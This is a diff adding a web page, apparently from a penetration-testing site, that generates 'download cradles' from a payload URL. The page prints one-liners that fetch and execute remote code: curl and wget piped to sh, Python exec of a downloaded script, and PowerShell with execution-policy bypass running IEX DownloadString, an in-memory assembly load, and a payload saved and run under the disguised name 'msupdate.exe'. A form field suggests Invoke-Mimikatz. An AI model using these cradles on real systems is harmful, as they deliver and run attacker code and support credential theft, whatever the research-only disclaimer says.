@@ -1,0 +1,307 @@
+<script src="/assets/js/cradle-wizard.js"></script>
+
+<style>
+  pre {
+    display: block;
+    margin-top: 0;
+    margin-bottom: 1rem;
+    overflow: auto;
+    font-size: .875em;
+    border: none;
+    padding: 0;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+  }
+  .rouge-table {
+    width: 100%;
+    margin: 0;
+    padding: 0;
+    border-collapse: collapse;
+  }
+  .rouge-table tr {
+    background-color: inherit !important;
+  }
+  .rouge-gutter {
+    width: 30px;
+    text-align: right;
+    vertical-align: top;
+    padding-right: 10px;
+  }
+  .rouge-code {
+    text-align: left;
+    margin: 0 !important;
+    vertical-align: middle;
+    padding-left: 10px;
+  }
+  pre {
+    padding-left:10px;
+    margin: 7px 0 7px 0;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+  }
+  .dev-notes {
+    font-size: 10px;
+    font-style: italic;
+    margin: 40px 0 0 0;
+  }
+</style>
+
+
+<!-- User Inputs -->
+<h2 id="cradle-wizard"><span class="me-2">Generate</span><a href="#cradle-wizard" class="anchor text-muted"></a></h2>
+
+<form id="cradleForm">
+  <table>
+    <tr>
+      <td width="50px">Path:</td>
+      <td>
+        <input size="32" type="text" id="path" name="path" placeholder="https://127.0.0.1/test.ps1" required>
+      </td>
+    </tr>
+    <tr>
+      <td>User-Agent:</td>
+      <td>
+        <input size="32" type="text" id="useragent" name="useragent" placeholder="(Optional)" >
+      </td>
+    </tr>
+    <tr>
+      <td>Headers:</td>
+      <td>
+        <input size="32" type="text" id="header" name="header" placeholder="X-API:true; X-API-KEY:12345" >
+      </td>
+    </tr>
+    <tr>
+      <td width="50px">Proxy:</td>
+      <td>
+        <input type="radio" id="proxyDefault" name="proxy" value="default" checked>
+        <label for="proxyDefault">Default</label><br>
+
+        <input type="radio" id="proxyBuiltin" name="proxy" value="system">
+        <label for="proxyBuiltin">Built-in System</label><br>
+
+        <input type="radio" id="proxyNull" name="proxy" value="null">
+        <label for="proxyNull">Null*</label><br>
+
+        <input type="radio" id="proxyOther" name="proxy" value="manual">
+        <label for="proxyOther">Other</label>&nbsp;&nbsp;
+        <input type="text" id="otherProxy" name="otherProxy" size=25 placeholder="http://127.0.0.1:8080">
+      </td>
+    </tr>
+    <tr>
+      <td>Invoke CMD:*</td>
+      <td>
+        <input size="32" type="text" id="cmd" name="cmd" placeholder="Invoke-Mimikatz">
+      </td>
+    </tr>
+    <tr>
+      <td colspan="2">
+        Esc Special Char:*
+        &nbsp;&nbsp;
+        <input type="checkbox" id="escape" name="escape">
+      </td>
+    </tr>
+  </table>
+  <button type="submit">Generate</button>
+</form>
+
+<div class="dev-notes">
+  *1 - Only applicable with PowerShell to define "$null" proxy value.<br>
+  *2 - Used to add DownloadString Invoke commands or DownloadData Assembly arguments.<br>
+  *3- Newer versions of PowerShell may require special character escape.
+</div>
+<hr>
+
+<!-- Generated Results -->
+<h2 id="results"><span class="me-2">Results</span><a href="#results" class="anchor text-muted"></a></h2>
+
+<div class="language-bash highlighter-rouge">
+  <div class="code-header">
+    <span data-label-text="Curl">
+      <i class="fas fa-code fa-fw small"></i>
+    </span>
+    <button aria-label="copy" data-title-succeed="Copied!" class="btn" data-clipboard-target="#curlCradle">
+      <i class="far fa-clipboard"></i>
+    </button>
+  </div>
+  <div class="highlight">
+    <code>
+      <table class="rouge-table">
+        <tbody style="border-bottom: 0 !important;margin-bottom: 0;">
+          <tr style="border-bottom: 0 !important;margin-bottom: 0;">
+            <td class="rouge-code">
+              <pre id="curlCradle">
+curl -sL  $URL | sh
+              </pre>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </code>
+  </div>
+</div>
+
+<div class="language-bash highlighter-rouge">
+  <div class="code-header">
+    <span data-label-text="Wget">
+      <i class="fas fa-code fa-fw small"></i>
+    </span>
+    <button aria-label="copy" data-title-succeed="Copied!" class="btn" data-clipboard-target="#wgetCradle">
+      <i class="far fa-clipboard"></i>
+    </button>
+  </div>
+  <div class="highlight">
+    <code>
+      <table class="rouge-table">
+        <tbody style="border-bottom: 0 !important;margin-bottom: 0;">
+          <tr style="border-bottom: 0 !important;margin-bottom: 0;">
+            <td class="rouge-code">
+              <pre id="wgetCradle">
+wget -qO- $URL | sh
+              </pre>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </code>
+  </div>
+</div>
+
+<div class="language-bash highlighter-rouge">
+  <div class="code-header">
+    <span data-label-text="Python - Standard Libraries">
+      <i class="fas fa-code fa-fw small"></i>
+    </span>
+    <button aria-label="copy" data-title-succeed="Copied!" class="btn" data-clipboard-target="#pyCradle">
+      <i class="far fa-clipboard"></i>
+    </button>
+  </div>
+  <div class="highlight">
+    <code>
+      <table class="rouge-table">
+        <tbody style="border-bottom: 0 !important;margin-bottom: 0;">
+          <tr style="border-bottom: 0 !important;margin-bottom: 0;">
+            <td class="rouge-code">
+              <pre id="pyCradle">
+python3 -c 'import urllib.request as x; exec(x.urlopen(x.Request("$URL")).read());'
+              </pre>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </code>
+  </div>
+</div>
+
+<div class="language-bash highlighter-rouge">
+  <div class="code-header">
+    <span data-label-text="Python - Requests">
+      <i class="fas fa-code fa-fw small"></i>
+    </span>
+    <button aria-label="copy" data-title-succeed="Copied!" class="btn" data-clipboard-target="#pyReqCradle">
+      <i class="far fa-clipboard"></i>
+    </button>
+  </div>
+  <div class="highlight">
+    <code>
+      <table class="rouge-table">
+        <tbody style="border-bottom: 0 !important;margin-bottom: 0;">
+          <tr style="border-bottom: 0 !important;margin-bottom: 0;">
+            <td class="rouge-code">
+              <pre id="pyReqCradle">
+python3 -c 'import requests; exec(requests.get("$URL").text);'
+              </pre>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </code>
+  </div>
+</div>
+
+<div class="language-bash highlighter-rouge">
+  <div class="code-header">
+    <span data-label-text="PowerShell - DownloadString">
+      <i class="fas fa-code fa-fw small"></i>
+    </span>
+    <button aria-label="copy" data-title-succeed="Copied!" class="btn" data-clipboard-target="#Ps1DownloadString">
+      <i class="far fa-clipboard"></i>
+    </button>
+  </div>
+  <div class="highlight">
+    <code>
+      <table class="rouge-table">
+        <tbody style="border-bottom: 0 !important;margin-bottom: 0;">
+          <tr style="border-bottom: 0 !important;margin-bottom: 0;">
+            <td class="rouge-code">
+              <pre id="Ps1DownloadString">
+powershell.exe -exec bypass -c "$c=New-Object System.Net.WebClient; IEX $c.DownloadString('$URL');"
+              </pre>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </code>
+  </div>
+</div>
+
+<div class="language-bash highlighter-rouge">
+  <div class="code-header">
+    <span data-label-text="PowerShell - DownloadFile">
+      <i class="fas fa-code fa-fw small"></i>
+    </span>
+    <button aria-label="copy" data-title-succeed="Copied!" class="btn" data-clipboard-target="#Ps1DownloadFile">
+      <i class="far fa-clipboard"></i>
+    </button>
+  </div>
+  <div class="highlight">
+    <code>
+      <table class="rouge-table">
+        <tbody style="border-bottom: 0 !important;margin-bottom: 0;">
+          <tr style="border-bottom: 0 !important;margin-bottom: 0;">
+            <td class="rouge-code">
+              <pre id="Ps1DownloadFile">
+powershell.exe -exec bypass -c "$c=New-Object System.Net.WebClient; $c.DownloadFile('$URL', 'C:\Windows\Temp\msupdate.exe'); C:\Windows\Temp\msupdate.exe;"
+              </pre>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </code>
+  </div>
+</div>
+
+<div class="language-bash highlighter-rouge">
+  <div class="code-header">
+    <span data-label-text="PowerShell - DownloadData">
+      <i class="fas fa-code fa-fw small"></i>
+    </span>
+    <button aria-label="copy" data-title-succeed="Copied!" class="btn" data-clipboard-target="#Ps1DownloadData">
+      <i class="far fa-clipboard"></i>
+    </button>
+  </div>
+  <div class="highlight">
+    <code>
+      <table class="rouge-table">
+        <tbody style="border-bottom: 0 !important;margin-bottom: 0;">
+          <tr style="border-bottom: 0 !important;margin-bottom: 0;">
+            <td class="rouge-code">
+              <pre id="Ps1DownloadData">
+powershell.exe -exec bypass -c "$c=New-Object System.Net.WebClient; [System.Reflection.Assembly]::Load($c.DownloadData('$URL')).EntryPoint.Invoke(0,$null);"
+              </pre>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </code>
+  </div>
+</div>
+
+<br>
+<hr>
+
+<h2 id="disclaimer"><span class="me-2">Disclaimer</span><a href="#disclaimer" class="anchor text-muted"></a></h2>
+The tools provided on this site are offered “as-is”, without warranty, and disclaiming liability
+for damages resulting from use. Copyright 2024 BreachTactics.
+
+All published content is intended for research and educational purposes only. Author is not responsible for illegal use.
+Use responsibly and never target systems you don't own or have explicit permission.
